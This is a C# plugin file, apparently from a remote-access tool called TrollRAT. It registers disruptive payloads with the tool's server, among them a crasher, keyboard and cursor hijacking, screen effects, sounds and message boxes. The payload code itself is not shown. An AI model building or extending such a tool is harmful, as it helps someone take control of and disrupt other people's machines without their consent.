using System;
using System.ComponentModel.Composition;

using TrollRAT;
using TrollRAT.Plugins;
using TrollRATPayloads.Payloads;

namespace TrollRATPayloads
{
    [Export(typeof(ITrollRATPlugin))]
    public class TrollRATPayloadsPlugin : ITrollRATPlugin
    {
        public string Name => "TrollRAT Payloads";

        public void onLoad()
        {
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadOpen());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadCrasher());

            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadTTS());

            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadMessageBox());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadKeyboard());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadCursor());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadGlitch());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadTunnel());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadReverseText());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadSound());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadDrawErrors());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadInvertScreen());

            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadEarthquake());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadMeltingScreen());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadTrain());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadDrawPixels());
            TrollRAT.TrollRAT.Server.Payloads.Add(new PayloadDrawImages());
        }
    }
}
